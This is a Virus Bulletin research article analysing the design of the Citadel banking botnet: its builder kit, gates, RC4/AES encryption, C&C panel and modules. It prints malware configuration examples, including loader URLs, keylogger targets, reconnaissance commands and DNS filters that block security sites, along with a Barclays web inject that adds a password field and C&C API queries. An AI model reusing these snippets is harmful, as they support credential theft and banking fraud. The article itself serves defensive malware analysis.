@@ -1,0 +1,401 @@
+Prosecting the Citadel botnet - revealing the dominance of the Zeus descendent: part one
+2014-09-02
+
+Aditya K. Sood
+Michigan State University
+,
+USA
+
+Rohit Bansal
+Independent Security Researcher
+,
+USA
+Editor:
+Martijn
+
+Grooten
+Abstract
+Citadel is a sophisticated descendent of the Zeus botnet. In this two-part article, Aditya Sood and Rohit Bansal provide insight into the bot's design components, including its system infection and data exfiltration tactics.
+Copyright © 2014 Virus Bulletin
+
+Recent years have seen a significant rise in cybercriminal activities, and in particular the theft of online banking credentials. The majority of cybercriminals use automated exploitation frameworks to infect computers and exfiltrate data. The most widely used weapons in this type of cybercrime are botnets. Botnets have been in existence for many years, but their design frameworks have changed over time. We are now seeing a third generation of botnets that are targeting the users of online financial services. This era of targeted attacks started with the rival Zeus and SpyEye botnets and is evolving. In this paper, we look at the design and working details of the Citadel botnet. Citadel, which is believed to have European origins, is a sophisticated descendent of the Zeus botnet. Our analysis provides insight into the design components of Citadel, including its system infection and data exfiltration tactics.
+
+1. Introduction
+Cybercrime is increasing because it is a lucrative business. In turn, this has led to a growth in crimeware services as well as automated exploitation and malware infection frameworks [1]. Botnets play a crucial role in that growth, with successful botnets containing large numbers (sometimes millions) of infected computers. Amassing such a large network of bots requires automation, and browser exploit packs (BEPs) have become the primary tool for automating the browser exploitation process. Drive-by download attacks drive users to BEPs, which then infect the users’ computers. In 2008, Provos et al. [2] collected approximately three million malicious URLs hosting BEPs, accounting for 1.3% of all first-page Google search query results over a period of 10 months. Vulnerable browsers are exploited and malicious payloads are executed, with droppers downloaded onto victims’ systems. The droppers then extract the bots and install them silently.
+Botnets like Zeus (or Zbot) have redefined cybercrime because of their skilled design and ability to target online financial and banking institutions. SpyEye appeared shortly after Zeus, and although the two were rivals, they shared several attack techniques. Next came ICE IX, a variant of Zeus, followed by a number of other botnets. Andromeda, Cridex and UPas are not widespread (at the time of writing this paper), but the Citadel botnet has been successful in spreading broadly across the Internet. Citadel is considered to be the child prodigy of Zeus, inheriting its functionality and attack methods, but improving them to work better with emerging technologies. McAfee has released a detailed study of Citadel [3], finding that it started in Germany and the Netherlands, and first targeted European sites. The study also looked at the different campaigns started by Citadel over a period of two years in order to understand its infection rate.
+Citadel uses several different techniques for conducting financial fraud, but the predominant one is the Automated Transfer System (ATS) attack for executing hidden transactions. A recent analysis of attacks against NBC [4],[5] suggests that Citadel is spreading globally. Interestingly, the attack is designed to manipulate traffic from a number of different banking websites [6], including Chase, Wells Fargo and Bank of America. An earlier study by CERT Polska [7] suggests that the majority of Citadel botnet traffic originates from Europe and Japan, of which 77% comes from Poland. Citadel is primarily motivated to attack banking websites from the client side because that is where the money is.
+Due to the fact that Citadel is designed for theft, it has become popular in the underground community – and fraudsters are willing to pay for access to it. As a result, Citadel is available as part of a number of crimeware services packages. It is important for us to dissect the Citadel botnet in order to understand its low level details so that better protection mechanisms can be designed. In this paper, we present the complete design of the Citadel botnet, including the details of various components and their functions. We will describe the bot’s behaviour, and then look at what might be next for the Citadel botnet.
+
+2. Related work
+Botnet analysis in general helps security analysts and defenders to understand the design of botnets and the stealthy techniques that are used to circumvent existing protection and detection mechanisms. A number of different botnets have previously been analysed in order to gain better insight into their exploitation tactics. Botnet analysis is a continuous process because of the ever-evolving nature of these automated frameworks.
+In 2011, Yan et al. [8] analysed RatBot’s techniques for bypassing multiple methods used by other adversaries (such as other bots) in the system. These actions show that bot wars [9] still exist. In 2009, Stone-Gross et al. [10] analysed the Torpig botnet over a period of several days in order to determine the volume of information stolen by the botnet through several data exfiltration methods. In an earlier study, we presented a complete design analysis of the SpyEye botnet [11], which dissected the component-based functionality of SpyEye to reveal how the design transforms over time. We detailed several variants of SpyEye that provided a deeper understanding of the botnet’s design. In 2010, Borgaonkar [12] presented an analysis of the Asprox botnet, which used an SQL injection attack to infect a large number of websites in order to distribute bot binaries. In 2009, Stock et al. [13] analysed the Waledac botnet by implementing a clone of the botnet called ‘Walowdac’ in order to perform large-scale traffic analysis to determine the success rate of malicious phishing and spamming campaigns.
+In 2010, Binsalleeh et al. [14] reverse engineered Zeus bot binaries in order to understand their code. Their approach was to extract the encryption keys by analysing code. That, in turn, helped them to decrypt the network traffic of Zeus as it communicated with its command and control (C&C) panel. In 2012, Lin and Lee [15] proposed a pebble trace technique for tracking malicious actors (bot herders) running C&C panels in the cloud without any use of existing technologies such as routing notifications, deployment monitoring and ISP support. Their prototype was tested against the Zeus botnet to traverse multiple layers of the cloud by identifying the cryptographic keys used in the configuration and deployment of a large number of Zeus bots.
+In 2010, Sinha et al. [16] dissected the Mariposa botnet in order to understand its architecture, C&C traffic flow and resultant impacts. Also in 2010, Celeda et al. [17] unveiled their analysis of the Chuck Norris botnet, which basically exploits the vulnerabilities present in SOHO embedded device components such as firmware. The characteristics and design of the Chuck Norris botnet make it different from other botnets because it compromises gateway devices rather than end-user machines.
+Finally, in 2012, AhnLab released a technical report detailing its researchers’ static analysis of Citadel [18]. Our goal is to expand on the previous research on Citadel, so we concentrate on the design and behaviour of various of its components.
+
+3. Methodology
+As discussed earlier, researchers use different techniques and tactics for botnet analysis depending on the availability of data and samples. In our study, we used both static and behavioural techniques to gather information. We began with several interesting steps to collect data for our experiments:
+We used the technique of back-tracking, in which we analysed the complete attack vectors used in targeted phishing attacks that coerced (or tricked) users into visiting malicious domains serving samples of Citadel. This process requires de-obfuscation of JavaScript, network hopping, etc. to find the exploit frameworks serving the Citadel bot.
+We executed a large set of experiments in an emulated and specially designed test environment in which the bot is executed in a controlled manner with basic configuration settings. Of particular importance is the fact that the bot is allowed to connect back to the C&C panel. This strategy allowed us to understand the communication patterns used by the botnet in transmitting data to its C&C panel.
+We also used techniques such as reverse engineering and debugging to analyse the Citadel samples as a part of static analysis. In addition, behavioural testing revealed the modifications made to data structures, the file system, registry and network connections. To automate the process of network analysis, we built an IPS/IDS signature for the Citadel botnet that helped us detect malicious domains running C&C panels.
+We used penetration testing and vulnerability hunting to find loopholes such as vulnerabilities and configuration flaws in the malicious servers hosting C&C panels. We tried this approach for assurance purposes, but the outcome of this experiment depends on the insecure design of botnets.
+Altogether, our data-gathering techniques resulted in a useful set of information to support our analytical results. We looked at Citadel versions ranging from 1.3.3.x to 1.3.5.x.
+Section 4 of this article covers the design of the Citadel botnet, including the functionality of different components, and in part two, we present the results and analysis of our experiments.
+We refer to the bot as a malicious executable (including the dropper) that infects the target system.
+
+4. Citadel's design and implementation
+In this section, we present the complete design of the Citadel botnet including its components and modules.
+Rather than following the traditional approach used by botnet developers to interact with their clients, Citadel’s developers opted to follow the professional Customer Relationship Management (CRM) approach. This change is an indication of the fact that the management of crimeware services is becoming more sophisticated. Generally, botnet developers use ICQ/IRC channels to handle support requests, but there are two major problems with this approach. First, one can ignore a request on an IRC channel. Second, this places a tremendous load on an individual support person because of the high volume of requests to be addressed. To overcome these issues, the Citadel developers follow a CRM model in which software problems or requests are addressed using a ticketing system. That is, a client initiates a ticket to report a bug, which notifies a developer of a problem that needs attention. CRM also adds value as it allows any client to provide feedback and exchange ideas with the developers. In addition, Citadel’s owners have incorporated the Jabber instant messaging service to send updates about developments and patches directly to the IRC channel used by the clients. In this way, users can be updated without needing to visit the CRM portal. Clients can also request new functionality by placing either public or private bids – public bids are available to all, whereas private ones are specifically for the intended client. This last feature allows the Citadel owners to cater to an individual client’s needs by building more advanced components and plug-ins for the botnet. It is analogous to a model in which clients submit their votes for the development of new features by paying an amount of money determined by the bidding process.
+Citadel’s design is similar to that of earlier botnets such as Zeus and SpyEye. It consists of a set of components including a builder kit, command and control (C&C) panel and several modules, as shown in Figure 1.
+Figure 1. Basic components of Citadel.
+
+4.1 Builder kit
+The builder kit is used for building the bot after it has been dropped onto a user’s computer. It can be customized using different configuration parameters. At the time of building, the bot’s configuration is defined in a config.txt file (other names can be used) and the configuration parameters are also used to generate a config.bin file, which is embedded in the bot itself. The C&C can later update the bot by sending a new, encrypted config.bin file. The build process entails several steps, as described below:
+An authorization key (login key) is required, which protects the C&C and the bot. The key is placed in the ‘global.php’ file on the C&C server as: define (‘BO_LOGIN_KEY’, ‘PUT_KEY_HERE’). In addition to this, an API key is also defined as: (‘API_TOKEN_KEY’, ‘PUT_KEY_HERE’). The use of ‘api.php’ is restricted to the bot only. These keys are required in order for the bot to access the gate (sometimes named gate.php), which must be passed in order to communicate with the C&C (cp.php) panel. In order to access the C&C panel, Citadel uses either basic or form based authentication, depending on the choices made by the bot herder. The C&C panel directory is restricted using htaccess and htpasswd, so that only the bot herder’s IP is al-lowed to connect to the C&C panel. Figure 2 shows the layout of the Citadel builder.
+Figure 2. Citadel builder kit.
+Once the web structure is set, the config.txt file is built. The configuration file consists of entries for the different modules to be added and includes timing parameters. In addition to this, it covers information relating to the encryption settings, URL settings for the bot, C&C, gate and configuration in the binary format. An example of a simple Citadel configuration file is shown in Listing 1.
+# Setting the modules in the following format
+
+entry "Video"
+a quality
+length 30
+end
+
+# Setting the encryption key
+
+encryption_key "key"
+
+# Setting the  primary entry for the configuration file in the binary format
+
+url_config1 "http://[domain]/file.php|file=config.bin"
+
+# Setting the backup entry for the configuration file in the binary format
+
+url_config2 "http://[domain]/file.php|file=config.bin"
+
+# Setting the path for the loader to load the bot
+
+url_loader "http://[domain]/file.php|file=citadel.exe"
+
+# Setting the entry for gate
+
+url_server "http://localhost/gate.php"
+
+Listing 1: Layout of Citadel configuration file.
+
+Table 1 lists the different configuration settings used in Citadel.
+Citadel configuration
+Description
+encryption_key
+Setting the encryption key
+entry/end
+Defining the name of the module
+url_loader
+Path from which the bot is loaded
+url_config
+Path from which the configuration file is fetched
+url_server
+Path to the gate
+disable_cookies
+To disable cookies [0/1]
+disable_antivirus
+To configure the mini AV functionality [0/1]
+enable_luhn10_get
+Enables the Card Swipe plug-in to verify the CC number, scans the GET request and dumps it [0/1]
+enable_luhn10_post
+Enables the Card Swipe plug-in to verify the CC number, scans the POST request and dumps it [0/1]
+remove_certs
+Manage certificates on the infected machine [0/1]
+timer_autoupdate
+Setting time to auto update the bot and download additional plug-ins
+disable_httpgrabber
+Manage the HTTP grabber plug-in [0/1]
+report_software
+Manage the bot’s ability to send information about the installed software from the infected machine [0/1]
+antiemulation_enable
+Manage virtual machine (VM) detection [1/0]
+timer_config [N1] [N2]
+Time (minutes) defined to update the bot with new configuration
+timer_logs[N1] [N2]
+Time (minutes) after which bot knocks C&C to transmit collected logs
+timer_stats [N1] [N2]
+Time (minutes) after which bot knocks C&C to provide stats
+timer_modules [N1] [N2]
+Time (minutes) defined to update the bot with new modules
+timer_autoupdate [N1]
+Time (hours) to update the bot executable with new crypt (obfuscation) code
+[N1] is the time that defines a successful operation; [N2] is the time that defines an unsuccessful operation
+
+Table 1. List of configuration settings used by Citadel.
+
+4.2 Gaskets/gates
+Beginning with Zeus, botnet authors started to implement gates, and Citadel is no different. The gates are called ‘gaskets’ in Citadel’s terminology, i.e. components that join two surfaces. In a botnet, the gates work as intermediate components to route bot communications to the C&C panel. The bot does not connect directly to the C&C; instead, it first has to pass through the gate which allows the C&C communication. Citadel also checks for a particular destination IP address before allowing bots to communicate. This additional check helps hide the C&C from security analysts. The builder outputs two files: ‘file.php’ (sometimes named ‘gate.php’) and ‘file_config.php’. The ‘file.php’ file is the main gate component, which handles all the requests from different bots, whereas ‘file_config.php’ contains configuration parameters, taken from the main configuration (config.bin) file, for the proper functioning of the gate. The ‘file_config.php’ file contains the encryption key in a modified form extracted from the config.bin file. Including the key in the configuration files facilitates inclusion of the key in ‘file.php’. The gate component (file.php) can be deployed on the same server or a different one and is restricted by using an htaccess file. Since the gate component is designed in PHP, it is essential that the deployed PHP configuration on the C&C server supports sockets, otherwise the gate component will fail. It is also possible to seal the gate component by configuring redirect rules (redir.php).
+
+4.3 Encryption/decryption design
+Encryption is implemented in botnets to protect the communication channel and to make analysis harder. Typically, botnets such as Zeus and Citadel implement encryption at two specific places: the HTTP communication channel and the binary. All of the POST requests sent to the C&C panel are encrypted, thus significantly increasing the difficulty of deducing communication details. In our traffic analysis, we found that Citadel first sends an encrypted POST request to the gateway before downloading the config.bin file. This action enhances the security of the download because the gateway requires specific data from the bot in order to fetch the config.bin file. We believe that this POST request carries the login information because Citadel requires a login key in addition to an encryption key. The mechanism used by Citadel to fetch its configuration file is different from that used by Zeus. The mechanism means that analysts will not be able to fetch the config.bin file directly by sending a GET request (as can be done in Zeus) – making analysis significantly more difficult.
+The earlier version of Citadel (1.3.3.1) used an encryption pattern similar to Zeus’s in which visualEncrypt and visualDecrypt functions were used with RC4 encryption. Citadel enhanced this encryption by using MD5 (login_key) and encryption_key together to perform encryption. Listing 2 shows how the VisualEncrypt, VisualDecrypt and RC4 functions are deployed in Zeus and Citadel.
+function visualEncrypt(&$data)
+{
+$len = strlen($data); for($i = 1; $i < $len; $i++) $data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
+}
+function visualDecrypt(&$data)
+{
+$len = strlen($data);
+if($len > 0) for($i = $len - 1; $i > 0; $i--) $data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
+}
+function rc4(&$data, $key)
+{
+$len = strlen($data);
+$loginKey = BO_LOGIN_KEY;
+$loginKeyLen = strlen(BO_LOGIN_KEY);
+for($z = $y = $x = $w = 0; $x < $len; $x++)
+{
+$z = ($z + 1) % 256;
+$y = ($y + $key[$z]) % 256;
+$tmp      = $key[$z];
+$key[$z]  = $key[$y];
+$key[$y]  = $tmp;
+$data[$x] = chr(ord($data[$x]) ^ ($key[(($key[$z] + $key[$y]) % 256)]));
+$data[$x] = chr(ord($data[$x]) ^ ord($loginKey[$w]));
+if (++$w == $loginKeyLen) $w = 0;
+}
+}
+# Zeus 2.0.8.9 encryption steps
+$v_encrypt = visualEncrypt($Data);
+$encrypted_data = rc4( $v_encrypt, $config['botnet_cryptkey_bin']);
+# Citadel 1.3.3.1 encryption steps
+$final_key = rc4(md5($login_key),  $encryption_key)
+$v_encrypt = visualEncrypt($Data);
+$encrypted_data = rc4($v_encrypt, $final_key)
+
+Listing 2: Citadel encryption prototype.
+
+However, Citadel (1.3.4.5) changed the encryption process because decrypting the previous one was trivial. To make it more complex, the encryption process first added layers with the introduction of a salt value and XOR functions. Next, the core design started supporting AES encryption. As a result, the encryption process outputs AES-128 secure encrypted data for communication between the bot and the gateway. SophosLabs researchers presented an interesting analysis of the encryption and decryption process in the Citadel botnet, showing how AES is used 19. One reason Citadel enhanced its encryption process was that earlier versions of the bot were being detected by the Zeus Tracker service [20]. To avoid this detection, the encryption code needed to be strengthened.
+
+4.4 Main admin panel
+The main administration panel is also known as the command & control (C&C) panel and it controls all the infected computers running the Citadel bot. The Citadel C&C panel is written in PHP and the default name used is ‘cp.php’. The C&C panel has the following functions:
+It manages all the bots running on infected computers and provides a centralized platform for communication and management.
+It issues commands to bots to update their configuration and rules.
+It stores all the data exfiltrated from the infected computers in its database. The C&C panel provides a nice web interface to facilitate interaction with the database and retrieve the stolen information.
+It manages all the different modules, such as the video grabber, screen grabber and web injects. It commands the bots to update these modules accordingly.
+It builds reports by performing statistical analysis on the information exfiltrated from infected computers.
+Figure 3 shows the layout of Citadel’s main admin panel.
+Figure 3. Citadel’s main admin panel.
+(Click here to view a larger version of Figure 3.)
+
+4.5 Citadel modules
+The different modules supported by Citadel are discussed in the following sections.
+
+4.5.1 Video grabber and screenshot stealer
+Video grabbing is a data exfiltration technique in which a bot records videos when a user is interacting with the browser to surf the Internet. For example, the bot may record a video when a user is transferring money from his or her personal bank account. Citadel stores the stolen videos in HTML5 video format for later viewing by the bot herder from the main admin panel. In addition, Citadel implements an API for managing the videos. These APIs generate HTML-based codes with embedded videos that are accessed directly from the bots running on infected machines. This means that the bot herder can embed the HTML code containing the videos anywhere in a third-party website without the need to access the main admin panel. This enhances mobility, and at the same time provides security because the stolen videos can be watched from different places. These videos can also be viewed directly in an online media player using this API. Table 2 shows the API queries for this functionality.
+Format: api.php / <security-token> / <handle> / <action> [. <extension>]? <parameters>
+
+Parameters (video-grabber API)
+Description
+api.php
+API functions for grabbing videos
+<security-token>
+Authentication code required to log onto the server for accessing stolen videos
+<handle>
+The object name, i.e. video
+<action>
+Actions to be performed
+<extension>
+Specifying the output format: PHP, HTML, JSON, XML
+<parameters>
+Function codes used by the main controller, e.g. embed
+Table 2. Details of the video-grabber API.
+Examples:
+
+http://<domain_name>folder/api.php/ahro4uNg/video/list? botId=AXDFRGT
+http://<domain_name> /folder/api.php/ahro4uNg/video/list? botId=NGHJUL789&embed=1
+define ('API_TOKEN_KEY', 'api_token_key');
+
+Citadel also contains a built-in function that hooks Win32 API calls to take screenshots from the infected systems. Citadel monitors the location of the mouse pointer and captures the screen accordingly. A simple prototype is presented in Listing 3, which is used in collaboration with Win32 APIs such as SetCursorPos and GetCursorPos for capturing screenshots.
+HDC src = GetWindowDC(handle_source_window);
+
+HDC dest = CreateCompatibleDC(src);
+HBITMAP capture = CreateCompatibleBitmap(src, src_window_X, src_window_Y);
+
+SelectObject(dest, capture);
+BitBlt(dest,0,0,src_window_X, src_window_Y, src,0,0,SRCCOPY);
+ReleaseDC(handle_source_window, src);
+DeleteDC(dest);
+
+Listing 3: Screen-capturing prototype using Win32 API.
+
+4.5.2 Multi-process keylogging
+Citadel implements keylogging to capture keystrokes entered by the user. It has the ability to implement multi process keylogging, where the keylogger reads keystrokes entered by the user in multiple applications, not just the browser. By default, the keylogger is active only for browsers. For additional applications, the keylogger settings must be set in the configuration file, as shown in Table 3.
+Keylogger parameters
+Description
+Entry ‘<module>’
+Activating the module: Keylogger
+Processes
+List of target processes that will be keylogged
+Time
+Defining for how long the application should record the keys
+Table 3. Keylogger configuration.
+Example:
+
+entry "Keylogger"   | ------------------- Keylogger module
+processes "calc.exe; * notepad *" | ------------- Target processes to be keylogged
+5 time             | -------------  Record keystrokes for 5 minutes
+End
+
+4.5.3 Command execution module
+When Citadel first executes on an infected machine it extracts operating system information. This information provides a bot herder with details of the infected environment, which helps to customize operations. The results are stored in the main admin panel for later use. Table 4 shows the list of parameters used to configure the CmdList module in the main configuration file.
+Command parameters
+Description
+Entry ‘<module>’
+Activating the module: CmdList
+Commands
+List of the commands to be executed
+Table 4. Command module configuration.
+Example:
+
+entry "CmdList"
+"hostname"  |---------------------- Get the hostname of the infected machine
+"netstat" |---------------------- Get the list of opened ports and existing network connections
+"systeminfo" |---------------------- Get the complete system information
+End
+
+4.5.4 SOCKS and VNC controller
+Citadel supports two different back-connect servers for initiating reverse connections to the bot when it is placed inside a NAT environment or the network is filtered for communication. Secure Sockets (SOCKS) is designed specifically to access filtered areas of the networks using a secure proxy. It is implemented by creating a local SOCKS proxy and then routing traffic through it to connect back to the C&C. The bot starts a SOCKS proxy if it is configured with that setting during build time. Citadel uses SOCKS and Virtual Network Computing (VNC) mode together for C&C communication. Citadel can turn off the User Account Control (UAC) mode and the host’s firewall to open up ports for nefarious purposes such as communicating with the C&C. For configuration of SOCKS, the URLs of the gate and admin panels are required.
+The VNC controller is a feature-rich component that uses the VNC protocol to communicate with the bot. The C&C operates in two modes: ‘connect’ and ‘auto-connect’. As the name suggests, the ‘auto-connect’ configuration triggers a back connection with the C&C panel whenever it is activated, whereas ‘connect’ only establishes a connection on demand. In addition, Citadel can deploy filters in the form of URL masks to capture only specific sets of websites while using VNC (see the filtering discussion below). Table 5 shows the API patterns used by the Citadel botnet for SOCKS and VNC communication.
+Format: api.php / <security-token> / <handle> / <action> ? <parameters>
+
+Parameters
+Description
+api.php
+API functions for VNC admin and SOCKS
+<security-token>
+Authentication code required to log onto the server for accessing stolen videos
+<handle>
+The object name, i.e. VNC or SOCKS
+<action>
+Actions to be performed
+<parameters>
+Bot identifiers and protocol
+Table 5. Configuration parameters of VNC admin and SOCKS.
+Examples:
+
+http://<domain_name>/folder/api.php/ahro4uNg/vnc/connect? BotIP=X.X.X.X& protocol = VNC
+http://<domain_name>/folder/api.php/ahro4uNg/socks/connect? BotIP =X.X.X.X& protocol =SOCKS
+
+define ('API_TOKEN_KEY', 'api_token_key');
+
+4.5.5 DNS and web filters
+Citadel provides both DNS and web filters.
+DNS filters: The bot has the ability to control DNS traffic flow from the infected system, such as DNS redirection, modification and blocking. This functionality allows the bot herder to restrict access to security vendor websites. Up until version 1.3.5.1, the DNS filters only worked for system-level software and not for browsers. However, we expect later versions of the bot to extend this filtering. DNS filters can prevent access to C&C gates or log servers from the infected machines. The filters can be implemented in several ways [21] depending on the design of the bot. Table 6 shows how DNS filters are configured.
+Command parameters
+Description
+Entry ‘<module>’
+Activating the module: DnsFilters
+Parameters
+List of DNS entries to be restricted
+Table 6. Enabling DNS filters.
+Example:
+
+entry "DnsFilters"
+"Microsoft.com = 127.0.0.1" |----------------------- Restricting DNS Resolution
+"Wepawet.com = 127.0.0.1"
+"anubis.org = 127.0.0.1"
+End
+
+Web filters: These filters are typically deployed to target the data-stealing process to a specific set of websites. The filters direct the bot to perform operations such as screenshot stealing, etc. against a given set of websites which are provided as parameters in the configuration file. The web filters work in conjunction with other modules, such as the video grabber or screenshot stealer, to capture specific data. Citadel uses special characters such as ‘@’ and ‘#’ to enable certain filters, as shown in Table 7.
+Command parameters
+Description
+Entry ‘<module>’
+Activating the module: WebFilters
+Parameters
+List of filters
+Table 7. Enabling web filters.
+Example:
+
+entry "WebFilters"
+"@ * example / *"  | ---------------------------- Activates screenshot stealer
+"@ @ * example.com / *" | -------------------------- Activates full screen stealing
+"# * example.com / *"  |----------- Activates video recording
+End
+
+4.5.6 Geolocation filtering
+Citadel implements aggressive filtering based on geographical locations. This means that it can restrict traffic from a specific country simply by configuring the geolocation options in the C&C panel. This allows Citadel to target a specific country during an infection campaign. Further, it can stop access to the C&C panel from particular locations, which can impede the ability of malware analysts to gain access to the remote server. Citadel also deploys gateway filtering, so if a connection is initiated from a restricted country, the gateway simply rejects it or replies with an error. It is also possible to filter IP ranges belonging to a restricted country. For example, if the C&C is hosted in Poland and geo IP filtering is enabled, only Polish computers will be able to receive the bot for installation and only Polish computers will be able to communicate with the C&C. We determined that Citadel uses the MaxMind GeoIP library to implement country-based filtering.
+
+4.5.7 FTP iframe injector
+Citadel has a built-in module for injecting iframes into HTML pages using FTP accounts. The FTP credentials are stolen from infected machines when the user communicates with servers using FTP. The FTP iframer is an automated code injection plug-in that can be used to distribute infections. The plug-in has the following features:
+To prevent any conflicts in PHP/ASP/JSP/HTML pages, the code is injected at the end of the web page.
+Three different modes are used for interacting with the web page. If the mode is set to ‘off’, the iframe remains dormant. If the mode is ‘inject’, the iframer injects malicious iframes, and if the mode is ‘preview’, then it only walks through the web pages without performing any modifications.
+A depth level can be specified for traversing directories to find target web pages. The depth level de-pends on access masks specified for directories.
+The plug-in uses a cron job that queries the database for potential new FTP accounts.
+Table 8 shows the API used to extract FTP accounts from the database to be used by the iframer.
+Format: api.php / <security-token> / <handle> / <action> [. <extension>]? <parameters>
+
+Parameters (FTP iframer API)
+Description
+api.php
+API functions for grabbing videos
+<security-token>
+Authentication code required to log onto the server for accessing stolen FTP credentials
+<handle>
+The object name, i.e. iframer
+<action>
+Actions to be performed
+<parameters>
+Function codes used by the main controller, e.g. embed
+Table 8. FTP iframer API in use.
+Examples:
+
+http://<domain_name>/folder/api.php / <token> / iframer / ftpList
+http://<domain_name>/folder/api.php / <token> / iframer / ftpList? date_from = []& state = all
+http://<domain_name>/folder /api.php / <token> / iframer / ftpList? date_from = [] & state = all & plaintext = 1
+define ('API_TOKEN_KEY', 'api_token_key');
+
+4.5.8 Cryptor and Scan4You
+The C&C provides a cryptor service that has the ability to apply obfuscation patterns to make the bot difficult to detect. Interestingly, this is a paid service implemented by Citadel’s developers: if the bot is generated using the cryptor service, a notification is sent to a database to check whether the user has paid for the service. In addition to this, in order to provide more efficiency and security, the C&C has an integrated Scan4You service, which is used to scan all generated bots on the server for possible detection by any anti-virus engine. Scan4You [22] is an anonymous online service that checks the resistance of an executable file to detection by anti-virus and other security software. Once the scan is completed, a notification is sent to Jabber about the results of the scan. For this service, a Scan4You profile ID is required, including the API token and Jabber address for notifications. Scan4You is ideal for these purposes because it does not share samples with anti-virus vendors or any other public repositories. Figure 4 shows how the cryptor service handles obfuscated executables.
+Figure 4. Cryptor in action in Citadel C&C.
+
+4.5.9 Web injects
+Web injects is a man-in-the-browser (MitB) technique of injecting illegitimate content into the HTTP responses sent by the target web server. As a system is infected, Citadel can easily hook into different browser libraries to alter the communication flow or to write web payloads into the HTTP responses. Web injects are used for data exfiltration and performing automated transactions on the user’s behalf. Citadel has taken this technique from Zeus. Listing 4 shows a simple example of a web inject in which an input box is injected into a Barclays Bank web page before it is opened in the browser. Basically, Citadel has the ability to inject into any HTTP GET or POST request. It uses tags such as set_url, data_before, data_inject and data_after to map the web page so that illegitimate content (HTML/JS) can be injected at the right place. Malware at Stake has presented the details regarding the usage of these parameters [23].
+set_url https://ibank.internationalbanking.barclays.com/logon/icebapplication* GP
+data_before
+name="simple_surname_text"*<tr>
+data_end
+data_inject
+<td class="bold" width="22%" nowrap="">Memorable word:</td><td colspan="2" align="leftv width="35%"><font class="inputstyle"><input type="password" name="UKpass" id="simple_surname_text" size="24" maxlength="24" value="" class="" title=”Memorable word”/></font></td></tr><tr>
+data_end
+data_after
+data_end
+
+Listing 4: An example of web inject code.
+
+4.5.10 Grabbers: HTTP and software
+Citadel implements grabbing functionality in which it hooks the libraries of software to capture credentials and other sensitive information. The grabbers are categorized into two classes:
+HTTP grabbers: these grabbers mainly target browsers, where the process is known as form grabbing. Using this technique, Citadel captures sensitive information such as username, password, SSN, credit card number, etc. The details are entered as values in the different fields of an HTML form. The bot hijacks all POST requests sent from the browser simply by hooking specific functions present in the browser libraries. HTTP grabbers play a significant role in exfiltrating data from infected computers. This technique can be combined with web injects to coerce users into supplying data that might otherwise not be available, e.g. asking for a PIN or SSN on a bank login page.
+Software grabbers: these grabbers aim to steal credentials from software that uses protocols such as FTP, POP3 and SSH to communicate with the remote domains. For this, Citadel hooks functions such as WSASend that are present in the network libraries used by the operating system to communicate with a target domain. Software such as WinSCP, WSFTP, Total Commander, Smart FTP, FTP Commander, Outlook, Thunderbird, FileZilla, Macromedia Flash and Core FTP can be hooked by Citadel to grab information.
+In part two of this article we will present the results and analysis of our experiments.
+
+Bibliography
+[1] Sood, A.; Enbody, R.J. Crimeware-as-a-service – a survey of commoditized crimeware in the under-ground market. 2013. Internal Journal of Critical Infrastructure Protection. http://dx.doi.org/10.1016/j.ijcip.2013.01.002.
+[2] Provos, N.; Mavrommatis, P.; Rajab, M.A.; Monrose, F. All your iFRAMEs point to Us. 2008. Proceed-ings of the 17th USENIX Security Symposium (SS’08).
+[3] Sherstobitoff, R. Inside the World of Citadel Trojan. McAfee Labs White Paper. http://www.mcafee.com/us/resources/white-papers/wp-citadel-trojan.pdf.
+[4] Schwartz, M.J. NBC Websites Hacked To Serve Citadel Financial Malware. http://www.informationweek.com/security/attacks/nbc-websites-hacked-to-serve-citadel-fin/240149106.
+[5] SophosLabs. NBC website hacked and distributes malware – here’s what happened. http://nakedsecurity.sophos.com/2013/02/22/nbc-website-hacked-and-distributes-malware/.
+[6] Fox-It. Write-up on nbc.com distributing Citadel malware. http://blog.fox-it.com/2013/02/21/writeup-on-nbc-com-distributing-citadel-malware/.
+[7] Cert Polska Technical Report. http://www.cert.pl/PDF/Report_Citadel_plitfi_EN.pdf.
+[8] Yan, G.; Chen, S.; Eidenbenz, S. RatBot: anti-enumeration peer-to-peer botnets. 2011. Proceedings of the 14th International Conference on Information Security (ISC’11).
+[9] Sood, A. Bot Wars – The Game of Win 32/64 Takeover. Hack-in-the-Box Magazine. http://magazine.hitb.org/issues/HITB-Ezine-Issue-009.pdf.
+[10] Stone-Gross, B.; Cova, M.; Cavallaro, L.; Gilbert, B.; Szydlowski, M.; Kemmerer, R.; Kruegel, C.; Vigna, G. Your botnet is my botnet: analysis of a botnet takeover. 2009. Proceedings of the 16th ACM confer-ence on Computer and Communications Security (CCS ‘09).
+[11] Sood, A.; Enbody, R.; Bansal, R. Dissecting SpyEye – Understanding the design of third generation botnets. 2012. Elsevier Computer Networks Journal. http://dx.doi.org/10.1016/j.comnet.2012.06.021.
+[12] Borgaonkar, R. An Analysis of the Asprox Botnet. 2010. Proceedings of Fourth International Conference on Emerging Security Information Systems and Technologies (SECURWARE).
+[13] Stock, B.; Göbel, J.; Engelberth, M.; Freiling, F.C.; Holz, T. Walowdac – Analysis of a Peer-to-Peer Bot-net. Proceedings of the 2009 European Conference on Computer Network Defense (EC2ND).
+[14] Binsalleeh, H.; Ormerod, T.; Boukhtouta, A.; Sinha, P.; Youssef, A.; Debbabi, M.; Wang, L. On the analysis of the Zeus botnet crimeware toolkit. 2010. Proceedings of the Eighth Annual International Conference on Privacy Security and Trust (PST).
+[15] Lin, W.; Lee, D. Traceback Attacks in Cloud – Pebbletrace Botnet. 2012. Proceedings of the 32nd International Conference on Distributed Computing Systems Workshops (ICDCSW ’12).
+[16] Sinha, P.; Boukhtouta, A.; Belarde, V.H.; Debbabi, M. Insights from the analysis of the Mariposa botnet. 2010. Proceedings of the Fifth International Conference on Risks and Security of Internet and Systems (CRiSIS).
+[17] Celeda, P.; Krejci, R.; Vykopal, J.; Drasar, M. Embedded Malware – An Analysis of the Chuck Norris Botnet. 2010. Proceedings of the 2010 European Conference on Computer Network Defense.
+[18] AhnLab Citadel Analysis Report. http://seifreed.es/docs/Citadel%20Trojan%20Report_eng.pdf.
+[19] Wyke, J. The Citadel crimeware kit – under the microscope. http://nakedsecurity.sophos.com/2012/12/05/the-citadel-crimeware-kit-under-the-microscope/.
+[20] Zeus Tracker. https://zeustracker.abuse.ch/.
